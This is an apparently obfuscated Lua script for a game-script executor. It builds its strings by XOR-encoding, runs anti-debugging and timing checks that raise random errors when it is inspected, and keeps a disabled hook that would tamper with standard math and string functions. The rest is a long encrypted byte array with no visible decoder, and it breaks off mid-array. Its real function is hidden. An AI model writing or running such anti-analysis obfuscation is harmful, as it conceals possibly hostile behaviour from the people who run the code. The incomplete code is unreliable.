
local _0x00909691 = function()
    return false -- Disabled for executor compatibility
end

local _0xaee751e5 = function()
    if _0x00909691() then
        if rawset and getfenv then
            pcall(function()
                getfenv().math.floor = function(n) return n + 0.000001 end
                getfenv().string.sub = function(s, i, j) return s end
            end)
        end
    end
end
_0xaee751e5();

local _0x8b7c33bd = (function()
    local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or function(a,b)
        local r,p=0,1 while a>0 or b>0 do local ra,rb=a%2,b%2 if ra~=rb then r=r+p end a,b,p=(a-ra)/2,(b-rb)/2,p*2 end return r
    end;
    
    local env = (getfenv and getfenv()) or _ENV or _G;
    -- getrawmetatable check removed for executor compatibility

    
    local dbg = env[(function() local b={160,161,166,177,163}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()];
    if dbg and dbg[(function() local b={163,161,176,177,180,178,165,168,177,161}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()] then
        local upv = dbg[(function() local b={163,161,176,177,180,178,165,168,177,161}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()](function() end, 1);
        if upv ~= nil then
            env[(function() local b={161,182,182,171,182}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()](env[(function() local b={176,171,183,176,182,173,170,163}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()](math.random(1000, 9999)));
        end;
    end;
    

    
    local clk = env[(function() local b={171,183}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()] and env[(function() local b={171,183}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()][(function() local b={167,168,171,167,175}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()];
    if clk then
        local t0 = clk();
        for i=1, 500 do end;
        if (clk() - t0) > 0.1 then
            env[(function() local b={161,182,182,171,182}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()](env[(function() local b={176,171,183,176,182,173,170,163}; local s="" for i=1,#b do s=s..string.char(bxor(b[i],196) % 256) end return s end)()](math.random(1000, 9999)));
        end;
    end;
    
end);
pcall(_0x8b7c33bd);

local _0x99719744 = function(...) 
    local _0xe0f5c193 = select('#', ...)
    if _0xe0f5c193 > 50 then
        return function() return _0x99719744(_0xe0f5c193 - 1) end
    end
    return _0xe0f5c193
end
pcall(_0x99719744, 1, 2, 3, 4, 5);

local _0xf91ad43 = {148,237,213,217,209,50,38,45,13,2,15,114,121,107,67,68,78,191,191,171,159,128,235,253,224,215,199,197,48,59,51,19,27,18,117,127,108,78,78,76,179,186,169,144,132,150,248,225,232,194,197,203,33,34,31,0,3,119,121,124,84,91,83,177,188,175,143,158,137,238,238,234,205,196,200,50,57,43,3,13,1,127,127,96,84,67,171,187,168,138,157,131,247,230,232,214,197,207,53,57,49,16,5,14,109,97,106,81,89,73,188,165,181,152,130,148,245,228,214,192,201,54,57,60,19,27,14,104,125,109,82,68,73,177,187,168,150,154,143,241,231,246,216,198,213,57,38,41,1,11,126,125,125,84,82,92,188,190,173,136,152,141,239,249,235,211,219,207,56,39,55,18,5,11,99,102,106,95,95,65,161,170,145,157,157,242,250,226,201,219,205,53,37,43,22,25,17,123,102,112,83,65,74,172,172,170,157,152,138,255,226,244,212,198,54,32,35,21,7,6,114,102,104,87,91,82,178,187,177,154,131,141,237,231,235,210,217,206,57,56,33,26,1,20,122,96,75,91,73,183,167,162,156,155,147,242,240,242,212,219,204,46,37,46,13,6,13,113,121,107,94,70,85,186,163,169,129,139,242,253,253,214,222,220,50,61,51,16,26,12,111,112,113,80,67,77,173,161,174,140,129,140,227,231,234,220,223,203,33,39,16,29,29,127,114,97,73,95,70,168,186,173,145,132,140,240,251,229,214,199,215,54,36,40,3,3,0,98,103,107,92,94,181,184,189,146,157,129,233,252,236,214,197,200,49,57,49,20,3,13,109,98,110,76,76,77,163,160,171,156,159,138,255,254,213,219,192,42,59,37,9,30,9,104,113,108,81,68,72,176,187,169,150,135,151,242,231,232,195,199,193,34,42,44,31,30,117,125,125,80,92,65,169,187,173,150,133,143,243,249,241,210,196,205,45,36,47,12,3,13,126,120,111,90,65,84,190,163,150,128,132,243,250,252,221,223,211,52,62,50,18,27,15,110,97,110,77,78,77,177,185,168,154,152,139,247,255,236,216,192,43,59,32,10,25,7,116,102,107,93,88,82,182,176,177,144,131,141,237,238,239,204,195,205,35,37,40,28,31,1,124,99,75,84,67,183,167,166,150,134,137,243,248,242,211,219,207,46,34,44,16,26,8,119,100,118,90,71,85,185,165,180,159,135,245,224,226,202,222,198,52,38,43,20,27,18,113,127,113,87,66,78,173,175,170,140,133,140,254,248,225,215,194,212,61,35,22,0,6,117,122,124,87,94,83,177,177,178,148,155,143,238,239,237,208,218,195,53,36,54,30,2,21,121,100,116,90,64,181,160,167,151,154,156,246,242,238,200,217,200,47,58,36,14,3,8,115,122,105,76,70,76,190,184,171,151,130,148,254,234,203,220,194,52,39,38,17,6,15,125,120,114,81,88,79,174,161,172,144,154,136,243,228,246,218,199,213,55,43,52,30,1,117,96,97,87,71,70,176,187,179,151,154,146,247,255,241,213,195,206,45,33,42,12,0,12,126,120,111,91,95,77,180,190,159,158,131,234,252,226,201,216,199,53,37,38,26,25,17,112,102,109,77,65,79,178,185,174,156,152,140,248,226,244,213,194,53,32,38,31,7,2,118,123,115,84,95,82,177,191,177,150,133,142,237,231,233,204,194,206,62,56,41,24,31,0,117,126,86,89,67,170,184,161,137,155,137,245,229,236,215,196,200,58,59,40,21,4,23,112,102,118,89,66,72,162,164,161,156,158,246,253,224,202,211,195,55,38,39,23,5,9,116,121,113,91,68,78,173,162,169,145,153,140,250,229,245,222,197,212,56,42,11,30,4,116,103,96,73,89,72,181,165,175,151,132,136,244,251,233,213,196,215,50,57,41,25,5,21,127,102,116,92,74,171,190,165,148,135,132,244,230,230,211,216,210,48,58,47,14,7,14,112,122,104,84,68,86,189,167,181,157,139,137,225,228,211,222,221,51,57,33,9,31,10,117,101,103,86,68,68,180,187,168,148,132,151,243,249,234,216,197,213,59,39,52,30,11,107,120,101,84,71,64,169,189,169,149,133,138,243,250,241,214,199,205,45,34,47,17,25,14,123,120,111,89,66,84,180,163,149,128,133,244,250,252,220,217,206,40,60,43,15,16,10,110,103,105,83,90,72,178,164,182,151,128,136,226,227,236,193,197,63,32,32,19,25,28,124,120,115,80,81,79,175,186,173,144,155,136,248,250,237,212,196,214,58,38,53,25,4,9,97,102,86,94,93,176,187,161,137,147,140,245,229,235,208,196,207,58,59,45,16,4,23,115,103,107,67,64,76,191,191,171,155,158,241,251,253,210,222,194,41,50,46,21,5,7,119,121,113,90,67,80,182,161,183,147,129,136,227,237,235,194,203,192,60,62,16,28,3,106,126,104,73,90,74,181,165,170,145,132,143,250,230,240,216,207,202,44,37,40,30,24,9,122,98,116,89,65,171,186,169,138,154,129,247,230,232,214,216,210,59,61,44,14,3,9,109,99,109,76,67,78,189,184,161,158,130,148,249,228,214,192,195,54,57,60,22,27,14,104,123,106,81,68,77,176,187,171,153,135,151,247,228,232,195,197,193,34,42,42,28,30,119,126,125,85,83,92,182,186,173,136,154,142,242,228,235,215,198,208,52,37,55,25,2,22,122,103,107,66,71,72,188,190,158,153,128,234,242,229,201,223,201,40,57,45,17,4,14,115,123,109,86,71,87,178,164,168,131,131,137,255,255,233,217,195,43,63,35,10,31,6,116,102,109,93,88,82,181,184,172,142,143,143,240,250,232,209,217,201,56,56,44,31,1,20,123,107,75,84,68,183,167,161,147,134,139,242,229,234,215,218,209,49,38,45,13,1,14,113,121,99,86,69,85,187,165,180,154,134,245,224,232,202,222,200,52,38,39,29,24,18,116,113,113,90,69,77,173,175,175,140,140,130,254,248,234,220,193,212,59,35,22,0,6,115,122,124,83,94,83,181,176,178,149,153,143,238,228,238,208,218,201,53,36,54,23,7,21,121,107,116,85,64,181,160,167,151,135,137,241,251,243,208,208,207,47,49,43,14,4,8,115,122,106,76,64,76,190,184,169,156,129,148,251,235,203,222,194,55,39,39,17,6,13,115,120,114,90,89,79,174,167,172,144,154,140,245,228,246,220,193,213,56,37,52,28,3,117,96,104,87,90,92,179,185,174,136,156,139,239,248,228,206,196,207,51,58,43,18,25,14,123,101,117,87,74,73,161,162,159,128,135,242,250,252,212,198,202,60,56,50,21,25,15,110,96,101,77,79,73,177,185,173,156,152,138,249,255,233,221,192,43,52,40,10,19,4,116,102,102,87,69,73,181,164,172,147,133,144,241,228,234,204,197,207,62,56,47,26,31,15,117,126,85,89,67,170,187,188,157,157,142,232,250,231,210,196,205,58,59,44,21,7,23,112,121,110,87,69,85,183,163,170,129,130,245,253,253,222,217,193,41,56,44,8,29,6,111,121,108,80,91,76,179,167,183,148,128,139,227,229,239,194,192,193,33,39,20,30,29,112,122,124,81,93,78,168,176,167,146,132,133,245,251,236,212,196,215,50,57,47,24,5,21,123,106,105,65,66,183,189,189,147,152,129,233,254,243,211,222,207,47,59,44,16,27,9,113,103,119,83,64,75,163,166,175,130,133,143,225,227,211,222,221,49,57,33,9,29,9,117,101,109,80,68,78,186,187,164,146,132,151,240,231,246,214,194,200,34,37,40,31,30,119,125,96,74,89,67,183,166,168,150,133,138,244,249,241,219,206,205,45,39,42,17,25,3,125,101,117,86,95,78,186,163,139,159,128,244,231,231,212,219,211,50,58,47,15,30,8,110,97,106,77,78,72,178,185,174,159,133,149,246,229,233,193,203,50,32,32,30,7,0,112,120,115,81,69,79,181,185,177,149,142,141,237,238,234,209,217,203,59,38,53,27,1,20,121,100,86,64,66,182,185,188,149,154,142,232,248,235,210,196,197,51,59,45,25,26,12,115,103,118,90,88,64,186,162,180,156,134,235,254,232,202,210,196,55,38,43,21,24,18,118,126,108,78,71,74,173,163,170,145,153,141,253,230,245,216,223,205,59,35,11,30,3,116,103,96,85,91,83,180,189,175,143,144,145,250,239,237,205,207,203,50,57,46,31,5,21,122,96,105,65,71,179,160,169,145,135,136,246,248,243,213,219,210,55,63,44,14,6,9,109,110,109,76,66,72,189,184,173,159,159,136,250,227,203,217,197,42,51,32,20,6,15,113,123,114,83,68,68,186,166,176,151,135,137,236,227,232,222,216,193,61,34,52,20,3,107,125,104,87,71,67,177,184,179,146,152,143,239,248,232,211,219,206,52,58,43,23,25,15,125,102,117,91,65,84,180,164,150,128,135,246,249,252,214,211,211,49,59,44,15,25,17,119,111,109,77,79,75,178,185,170,159,133,149,250,230,234,193,198,43,57,41,23,7,7,116,120,115,81,91,79,175,186,168,147,155,137,245,250,232,216,196,214,58,39,43,2,2,8,124,126,83,88,64,170,189,163,137,156,137,232,251,235,209,196,205,46,36,42,16,26,8,121,100,118,89,67,85,182,167,170,129,135,235,252,232,215,199,195,52,56,51,19,16,18,117,124,111,78,64,77,173,174,173,145,153,143,254,230,245,219,193,201,33,34,20,29,29,116,126,124,92,93,78,168,184,173,145,132,137,240,230,240,217,193,202,44,33,41,3,6,0,98,103,109,95,94,182,160,160,144,154,156,240,250,237,200,220,206,50,36,46,17,5,16,114,122,104,88,68,86,184,165,171,130,134,138,252,254,213,216,195,42,61,33,9,24,8,117,101,111,82,90,81,180,165,173,141,130,142,241,249,236,218,216,207,57,63,33,31,0,107,117,97,87,71,72,179,187,179,147,156,146,242,241,241,218,197,206,45,39,40,12,3,2,126,120,104,92,65,84,181,162,150,128,129,242,249,252,213,198,198,51,56,50,20,17,12,110,101,110,80,90,77,180,164,182,152,135,149,253,228,244,223,198,53,32,34,23,26,28,115,127,110,72,89,72,175,189,170,142,133,137,243,250,233,209,217,204,55,37,53,25,6,20,121,106,75,93,69,180,167,169,137,146,135,245,229,237,210,218,209,50,37,45,13,6,15,113,121,98,93,88,76,185,191,171,148,131,235,244,224,215,199,201,54,59,51,21,29,18,119,112,113,90,68,78,173,174,183,150,134,139,227,229,239,194,197,206,33,33,18,30,29,119,121,124,86,92,78,168,189,171,143,159,133,238,225,239,211,218,194,49,57,40,23,5,21,118,98,106,65,70,181,189,189,144,152,129,233,243,237,200,221,201,47,63,36,19,27,8,112,103,119,82,70,75,163,162,170,130,139,128,225,234,213,222,221,62,39,39,17,27,19,114,122,114,84,94,81,179,163,174,141,128,151,242,227,235,195,196,204,34,39,40,28,30,115,120,96,74,92,68,169,179,168,149,133,143,241,250,241,212,206,208,49,37,42,12,7,8,99,100,96,66,65,73,191,190,149,157,157,254,254,225,201,222,204,40,62,40,15,16,15,112,123,106,83,90,74,183,164,182,158,129,149,248,229,244,223,198,53,32,39,10,29,6,116,102,105,84,91,82,181,184,172,142,143,143,240,250,232,213,217,194,57,56,47,31,1,20,125,98,86,64,67,181,186,188,146,158,147,240,240,242,210,217,207,46,47,48,16,3,10,108,103,105,67,65,65,162,162,173,159,158,247,255,253,210,220,193,41,51,43,8,25,9,111,122,105,83,91,72,179,186,171,153,132,150,253,229,235,194,195,200,60,62,19,31,0,106,127,99,73,94,71,168,176,173,145,132,139,243,230,240,212,195,202,44,39,47,3,1,0,98,97,107,95,94,180,160,165,149,154,156,252,254,243,208,208,210,51,59,47,14,15,14,109,99,109,81,89,76,182,165,181,154,132,148,245,225,214,192,192,53,39,39,29,27,19,114,120,108,79,94,68,174,165,175,144,154,138,246,249,234,216,216,202,61,33,52,29,0,118,96,98,85,90,92,178,185,179,151,144,146,240,251,239,206,198,207,45,39,46,17,25,2,123,120,107,89,95,76,185,160,139,154,131,234,243,230,212,198,205,53,59,50,16,16,17,123,101,109,77,78,73,172,167,162,131,128,128,255,255,233,223,195,43,52,35,23,7,3,115,102,102,82,69,78,176,186,177,148,134,144,246,226,234,204,195,201,35,32,46,2,6,10,127,126,84,64,69,178,186,188,150,159,147,245,241,242,219,219,207,46,32,45,13,14,3,113,121,108,94,70,85,185,163,169,129,129,244,253,253,213,218,220,48,61,51,18,24,12,111,121,111,83,91,78,178,167,183,150,128,150,253,237,245,214,193,202,33,34,21,0,7,114,122,124,83,95,83,188,190,178,151,154,143,238,231,239,205,199,204,49,57,34,31,6,21,119,99,105,65,64,179,189,189,151,153,156,241,252,238,200,221,199,50,36,43,18,6,16,119,99,106,76,76,78,163,165,174,130,131,138,255,254,213,221,192,42,61,35,20,6,13,113,101,102,91,68,77,183,165,176,149,132,151,245,226,235,195,195,204,34,32,40,28,30,114,126,99,74,89,66,169,190,168,149,133,136,243,250,241,212,198,205,45,47,40,17,25,13,123,120,97,89,66,84,191,171,150,128,130,246,250,252,211,222,206,40,58,45,15,28,4,110,100,109,83,90,74,178,164,182,153,128,136,226,230,236,193,197,63,32,40,18,25,28,125,120,115,85,94,79,175,188,168,142,134,141,240,250,226,210,199,214,55,37,53,27,4,9,97,101,94,93,93,182,185,161,137,158,140,245,229,234,214,196,197,53,38,48,17,4,9,108,98,106,94,88,64,189,162,180,153,129,235,250,233,202,223,192,55,38,38,8,29,9,114,100,100,82,69,80,179,174,183,145,129,136,227,236,235,194,198,192,60,62,17,25,29,126,114,124,86,89,77,168,186,170,143,155,139,243,251,236,211,196,215,56,44,54,27,7,8,98,103,107,65,66,191,160,161,148,153,156,246,248,238,200,218,202,50,36,41,17,27,14,120,122,107,84,71,86,183,184,170,153,130,148,249,226,213,192,195,55,58,60,21,30,13,104,125,108,79,89,75,179,187,164,145,132,151,243,229,235,195,198,205,60,63,45,24,30,118,117,96,74,88,66,183,166,174,150,152,146,243,251,236,206,194,207,45,37,44,12,3,11,125,120,107,94,66,84,185,165,150,128,131,243,231,228,220,198,203,48,59,50,23,4,15,117,102,112,85,79,74,172,163,171,158,152,137,250,226,244,221,192,43,61,39,23,7,2,117,120,115,80,91,79,175,187,169,147,155,133,244,250,236,216,196,214,60,38,43,2,6,10,124,126,83,95,64,170,184,166,137,155,136,232,249,234,209,196,203,51,38,48,20,1,10,108,108,111,67,76,78,162,170,170,159,158,241,224,230,208,218,220,52,56,45,8,26,14,114,100,106,81,70,80,179,167,183,151,141,139,227,237,224,223,223,204,63,35,11,21,5,119,103,100,86,70,72,179,184,178,150,153,143,238,227,236,208,218,195,52,36,54,31,1,21,124,106,116,89,65,181,160,168,151,154,156,242,252,238,200,216,202,47,59,45,19,27,10,115,100,119,81,89,76,183,165,181,158,129,138,225,230,213,221,221,52,56,33,9,26,11,104,120,102,82,68,77,176,165,176,151,132,138,236,237,232,222,216,204,61,63,47,26,3,107,125,96,84,71,72,181,187,179,147,157,143,239,249,232,206,195,197,45,46,47,18,25,15,126,120,107,88,66,84,181,166,139,148,128,247,231,228,208,216,211,49,59,50,22,16,12,110,96,101,80,90,78,178,164,182,156,135,136,226,227,236,193,193,48,61,61,23,25,2,105,126,110,85,69,78,176,185,177,155,132,144,247,225,247,214,198,200,35,39,40,2,11,15,124,126,86,89,93,179,178,188,157,152,141,232,251,236,207,216,196,51,59,40,17,4,23,115,101,107,67,76,75,188,191,171,159,158,245,244,224,202,223,193,55,38,47,20,24,18,117,125,108,78,67,72,173,175,173,140,131,131,254,248,236,223,223,206,56,35,11,25,4,106,125,104,73,94,76,182,165,166,143,155,139,243,251,236,208,196,215,53,45,54,27,0,11,98,103,105,65,69,177,189,189,148,155,130,233,243,230,200,219,205,49,36,36,19,27,13,121,103,119,83,68,72,163,160,169,159,159,128,248,227,203,220,197,42,62,40,9,18,15,118,101,108,82,68,78,177,166,176,152,130,151,248,227,246,216,198,203,34,39,42,1,6,112,125,125,83,82,65,169,188,168,136,152,139,241,228,237,206,198,203,48,58,45,25,4,22,125,102,104,66,67,76,191,190,158,152,157,254,253,252,221,217,205,40,49,46,18,4,8,118,102,112,80,64,87,185,173,182,150,132,139,226,230,244,221,199,54,32,32,23,25,28,113,125,115,92,91,76,175,176,175,142,129,138,240,250,227,217,196,214,61,37,40,2,6,12,127,126,80,94,93,180,179,161,137,155,141,246,229,237,209,217,209,48,35,45,13,2,15,108,97,98,67,65,74,188,191,172,156,158,242,248,224,202,221,195,41,62,41,8,27,13,113,100,107,78,70,72,176,186,169,144,135,150,253,237,245,215,199,202,33,34,11,29,8,119,103,99,85,88,83,189,185,175,143,158,142,240,251,235,211,218,200,55,57,43,29,6,21,120,99,105,65,69,180,189,189,145,158,156,245,253,243,212,218,204,47,58,44,14,0,11,112,122,107,86,89,78,182,184,173,154,129,148,244,224,203,219,198,55,39,39,28,27,19,125,113,114,82,93,79,174,163,176,152,142,138,236,227,235,221,216,201,60,34,52,28,6,118,96,105,87,71,71,189,166,166,149,155,146,251,249,236,206,199,207,48,58,42,22,25,9,120,120,108,92,65,84,185,160,139,148,135,247,231,231,208,198,198,50,37,46,16,26,17,119,101,112,81,65,74,172,166,168,157,152,140,247,255,233,217,192,43,52,61,31,28,1,105,123,109,86,69,74,177,185,177,149,132,141,237,229,233,204,193,204,35,37,41,28,31,13,124,126,95,94,64,170,185,166,137,158,137,232,248,235,209,196,207,46,34,36,16,26,14,112,103,118,88,76,85,189,160,170,129,130,246,224,229,208,218,220,52,56,45,8,27,6,111,126,110,80,91,68,176,186,163,151,132,150,252,229,235,194,197,193,33,33,20,29,29,118,127,124,85,93,83,177,185,172,143,153,140,238,225,233,208,218,194,52,57,34,25,24,8,123,97,116,93,65,171,188,167,151,135,130,244,248,243,212,209,210,50,61,47,14,4,14,109,111,99,81,89,66,190,166,181,152,131,137,225,230,211,221,221,48,63,60,29,29,19,119,120,108,79,88,77,179,187,165,147,135,151,245,230,246,219,205,213,63,39,42,1,6,107,122,100,87,71,65,177,166,169,156,133,142,247,250,241,213,197,208,48,32,42,12,2,3,126,120,111,94,66,84,181,166,149,128,129,243,231,225,220,219,211,53,56,44,15,16,12,115,123,100,82,71,87,180,161,182,152,131,149,252,231,234,193,198,54,61,61,19,30,1,105,114,106,72,93,71,175,189,175,144,155,140,242,250,226,212,196,214,63,33,53,22,11,20,122,97,85,64,72,180,167,166,157,155,147,244,251,236,207,222,205,51,59,44,21,4,23,116,96,118,91,76,72,162,171,168,159,158,246,253,224,202,217,197,52,38,40,23,5,14,116,100,107,80,69,80,185,166,170,140,131,143,254,248,224,221,223,205,58,62,31,30,3,106,124,98,73,95,75,181,165,167,147,154,145,251,231,237,205,198,207,49,57,35,30,24,0,120,98,116,91,67,181,160,169,150,154,156,243,249,237,200,208,205,47,58,37,19,27,15,114,100,119,86,71,75,163,173,171,159,159,140,254,254,210,218,221,54,62,34,9,30,14,104,121,107,82,68,76,180,187,165,150,154,143,242,231,246,215,198,213,61,36,41,1,1,118,126,125,80,91,65,169,187,171,149,133,134,247,228,228,213,198,208,54,39,41,12,1,10,126,120,109,90,66,84,184,161,139,153,137,247,231,231,214,216,211,60,48,50,20,29,12,110,101,111,77,68,66,172,164,169,157,152,128,226,227,236,220,222,54,58,61,31,27,1,105,127,109,86,69,70,178,164,164,148,134,144,246,231,233,204,199,202,62,56,33,28,2,20,125,102,75,93,73,170,187,161,151,134,140,246,248,242,219,220,204,46,47,41,13,5,12,108,100,111,93,88,73,188,162,180,152,135,246,224,233,210,199,192,50,38,41,16,27,18,117,100,107,85,70,80,176,163,183,152,140,150,246,230,235,194,202,201,33,35,17,29,29,118,123,98,73,94,77,181,165,170,144,153,145,251,228,240,212,206,215,52,36,40,3,5,11,127,127,106,88,67,171,181,164,138,156,135,233,254,236,214,197,200,51,57,49,21,2,13,109,102,110,76,65,77,163,172,173,156,159,137,225,231,208,221,221,48,63,60,23,26,14,104,123,106,81,68,74,182,187,164,153,135,151,242,228,232,195,195,200,63,63,33,31,3,107,127,98,74,93,71,169,191,172,150,133,139,243,249,241,219,197,205,45,36,45,12,12,12,99,99,107,92,95,77,188,163,139,148,133,247,231,228,209,198,207,60,37,40,23,26,17,114,101,112,85,78,74,172,162,170,157,152,142,254,226,244,222,198,53,32,37,19,7,0,124,123,115,92,88,76,175,184,173,147,155,137,244,231,247,211,195,214,56,34,53,26,7,10,97,96,86,93,93,190,191,161,137,146,139,232,250,231,207,216,200,48,59,41,16,26,13,119,100,118,89,68,75,162,164,168,156,158,244,248,227,202,223,220,60,60,46,8,31,14,113,100,100,91,91,69,178,167,183,151,134,150,251,226,232,194,198,201,63,62,20,29,0,106,126,100,84,70,73,183,165,170,155,132,137,240,229,240,214,199,215,53,32,43,3,7,9,124,127,109,91,94,177,184,163,138,158,129,233,248,232,213,197,204,50,58,49,27,14,16,117,101,106,76,77,86,182,172,168,130,132,136,255,254,210,221,192,42,50,36,20,6,10,119,101,109,91,89,81,179,166,174,141,142,139,241,249,238,219,197,213,61,38,52,25,11,107,126,100,84,71,65,180,166,167,144,152,146,245,248,239,206,206,202,45,36,47,18,25,8,99,103,110,95,95,78,188,160,139,159,129,247,231,233,214,219,211,49,59,50,23,30,12,110,98,101,80,90,77,178,164,182,159,135,136,226,231,235,193,197,48,61,61,21,24,2,105,115,115,83,94,79,175,177,169,142,131,132,237,231,238,210,217,207,61,56,47,26,2,20,116,107,86,64,66,191,167,167,145,155,147,247,229,232,213,217,209,48,46,45,13,0,9,113,121,104,92,69,85,182,167,180,159,138,246,224,225,212,217,220,61,59,46,8,30,11,114,100,109,87,91,78,182,186,174,148,135,150,255,229,245,218,196,201,33,42,23,30,29,117,115,124,85,95,77,168,190,178,149,159,140,238,228,236,211,218,203,56,57,43,26,5,21,119,97,116,89,74,182,160,163,159,154,156,242,248,238,200,208,204,50,36,40,22,27,14,118,103,119,81,71,72,163,162,181,151,129,137,225,226,210,192,197,49,39,41,17,24,19,113,101,104,85,89,81,176,174,173,141,133,138,241,249,232,218,198,213,62,32,52,29,10,118,96,105,87,89,92,180,187,174,136,156,139,242,228,234,208,219,197,57,39,55,25,4,8,99,102,105,95,95,65,184,163,139,148,130,234,243,231,201,216,207,54,37,42,18,4,11,119,102,112,87,66,87,185,163,182,153,134,139,226,224,244,212,202,54,32,38,31,26,28,114,122,110,72,95,74,177,164,168,142,129,138,240,250,227,209,199,214,58,36,40,2,10,13,124,126,84,94,93,190,188,161,137,146,143,246,229,232,211,217,209,48,34,45,13,5,8,108,97,98,67,76,73,188,191,172,129,131,242,253,253,214,218,194,41,63,41,8,24,11,113,100,106,80,91,77,183,167,183,148,140,139,227,229,233,223,223,204,57,35,11,31,3,106,120,102,84,70,77,182,187,178,146,154,140,238,239,233,208,218,202,50,57,40,23,5,21,122,99,106,65,64,182,189,189,151,158,129,233,248,236,200,217,201,47,62,46,16,27,13,112,122,106,84,68,86,186,164,171,130,138,128,225,235,213,222,221,48,57,60,20,19,14,104,123,103,82,68,68,187,187,165,146,135,151,240,231,246,223,194,200,34,42,41,31,30,112,117,125,83,88,65,169,185,171,136,157,137,239,248,233,208,219,201,48,58,46,20,4,22,121,97,117,92,74,84,186,161,149,128,128,245,231,231,210,219,211,54,48,47,15,24,4,110,100,111,83,90,74,178,185,169,151,133,149,247,227,234,193,197,62,32,34,21,26,28,112,126,115,80,81,79,175,186,169,144,155,139,243,231,247,208,192,203,35,34,45,2,7,0,97,97,84,94,93,180,186,188,147,156,142,232,249,234,207,219,196,46,38,47,19,26,11,115,121,107,87,69,85,188,170,169,129,134,255,224,227,210,217,220,55,59,51,18,30,15,111,121,108,80,91,74,179,167,183,150,128,139,227,228,237,194,194,192,60,62,30,31,3,106,122,96,84,70,74,176,184,178,154,155,145,247,225,240,217,194,201,44,34,54,29,3,8,98,96,109,65,74,177,160,165,148,153,156,252,251,243,209,209,207,47,56,47,16,27,13,121,122,108,83,68,86,183,160,181,152,132,148,251,227,213,192,195,55,58,60,29,24,14,104,126,109,79,90,74,179,187,164,147,132,151,249,228,235,195,204,207,63,63,42,27,30,119,123,125,87,88,66,169,186,172,136,154,136,242,228,235,210,197,208,51,33,55,18,0,8,99,102,107,66,70,78,188,190,159,149,128,234,253,224,212,198,206,48,56,50,17,29,17,118,96,112,89,68,73,172,172,170,158,152,138,251,226,244,219,193,43,59,38,10,31,5,119,102,109,85,88,82,178,191,172,142,128,137,237,226,237,204,205,206,61,56,42,28,31,8,116,99,75,93,65,180,167,164,157,134,140,240,251,242,210,221,209,58,47,45,13,3,10,114,121,98,95,69,85,189,166,169,129,129,244,224,233,208,199,196,49,56,51,22,24,18,119,124,108,78,79,73,173,162,163,140,128,143,253,248,234,223,223,205,59,35,11,20,2,106,123,105,73,90,74,182,165,170,145,132,143,244,230,240,214,207,202,44,35,42,30,24,15,122,97,116,88,71,171,184,169,151,135,128,244,248,243,213,217,207,47,63,40,19,27,8,114,122,111,86,89,76,188,166,181,159,129,148,248,230,214,192,194,48,39,40,19,6,15,119,123,114,80,89,81,179,174,173,141,132,142,236,229,226,195,197,205,60,63,40,28,30,127,116,96,74,91,64,183,166,169,149,152,146,240,252,239,206,192,207,45,47,45,17,25,12,124,102,117,87,74,84,181,167,150,128,131,245,231,229,221,198,203,54,59,50,22,26,17,113,96,109,77,71,78,172,167,163,131,128,141,252,255,233,193,194,62,61,61,16,31,28,125,114,115,93,93,76,175,188,172,142,134,132,240,250,233,210,199,214,63,38,40,2,3,12,124,126,94,95,93,190,188,161,137,156,139,246,229,232,210,217,209,59,34,45,13,0,8,108,103,99,67,69,76,188,191,161,159,158,254,250,224,202,219,197,41,57,38,8,17,13,113,100,109,78,64,68,176,186,173,144,135,150,253,229,232,194,194,204,60,62,30,31,29,117,115,97,73,92,70,181,165,169,154,132,138,241,230,240,210,192,215,49,45,54,30,7,11,98,99,106,92,94,182,185,160,138,155,132,233,254,231,200,216,202,49,36,45,16,27,8,121,103,119,84,69,72,163,164,161,130,131,140,252,254,214,192,199,49,58,60,17,27,13,104,127,110,82,68,74,177,166,176,147,130,151,242,237,246,220,197,203,34,33,42,28,30,117,120,96,74,82,67,169,184,168,136,144,140,241,228,233,210,198,208,54,34,42,12,12,14,99,97,97,66,65,75,191,190,147,158,157,241,253,225,201,216,198,53,37,44,20,4,11,113,102,112,88,68,87,181,162,171,131,130,128,255,255,234,221,195,43,53,35,23,7,8,112,102,105,83,69,74,178,186,177,146,135,141,237,238,233,209,217,201,57,56,32,22,31,10,120,96,75,91,64,183,167,164,146,155,147,252,249,236,207,216,205,51,59,46,21,4,23,121,121,107,86,69,85,187,170,169,129,132,240,224,228,213,218,220,55,56,51,22,30,18,113,122,111,78,64,69,173,175,169,145,153,142,252,248,233,215,223,204,62,32,11,21,0,119,103,96,86,91,83,180,188,178,154,158,145,250,227,238,205,192,202,44,45,44,30,24,9,126,97,116,84,66,182,160,165,146,154,156,252,251,243,209,209,207,47,58,36,19,27,14,112,103,119,81,70,75,163,164,171,130,134,143,225,230,222,221,221,51,57,33,9,29,10,117,101,105,86,68,73,187,187,168,146,132,151,243,228,235,195,192,204,63,63,41,28,0,107,126,104,74,89,68,183,166,171,149,133,139,251,249,241,213,206,205,45,37,43,17,25,8,123,101,117,87,71,84,188,170,150,128,131,247,249,252,211,211,211,52,58,47,15,28,9,110,110,107,77,71,74,178,185,170,159,133,149,253,230,233,193,202,50,32,39,16,7,0,118,120,115,81,88,82,178,189,172,142,130,141,243,250,227,216,217,206,59,38,53,27,31,1,117,99,75,89,72,183,167,165,151,155,147,240,250,239,207,218,201,46,33,43,16,26,12,121,100,118,86,77,85,188,166,169,129,129,242,224,224,209,199,195,55,56,51,16,25,15,111,120,104,83,91,76,180,186,168,152,153,136,250,230,245,218,194,212,60,39,22,0,8,119,121,124,84,82,83,189,186,175,143,144,143,238,230,229,208,218,200,50,39,54,28,6,8,98,101,109,92,94,178,184,189,146,156,156,244,250,237,200,219,206,50,36,37,22,6,16,118,99,119,84,76,86,183,164,171,130,131,138,252,254,215,216,192,42,51,37,9,25,7,104,125,108,81,68,76,174,167,171,144,154,136,242,231,246,223,204,213,61,39,41,1,6,117,96,100,80,90,92,188,186,173,136,155,143,242,228,229,208,198,208,51,37,55,21,3,22,122,101,107,66,69,65,161,165,147,157,157,255,248,252,212,211,211,54,61,44,15,28,12,110,98,107,80,90,75,177,167,182,156,140,149,255,231,234,193